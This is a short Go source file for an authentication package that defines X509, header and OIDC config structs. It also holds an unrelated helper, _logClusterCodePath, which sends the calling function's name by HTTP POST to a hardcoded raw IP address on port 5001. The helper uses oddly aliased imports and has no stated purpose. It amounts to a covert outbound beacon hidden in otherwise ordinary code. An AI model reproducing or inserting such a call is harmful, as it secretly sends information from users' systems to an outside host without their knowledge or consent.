package authn

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

type AuthnHeaderConfig struct {
	Enabled			bool
	UserFieldName	string
	GroupsFieldName	string
	GroupSeparator	string
}
type AuthnConfig struct {
	X509	*X509Config
	Header	*AuthnHeaderConfig
	OIDC	*OIDCConfig
}
type X509Config struct{ ClientCAFile string }

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
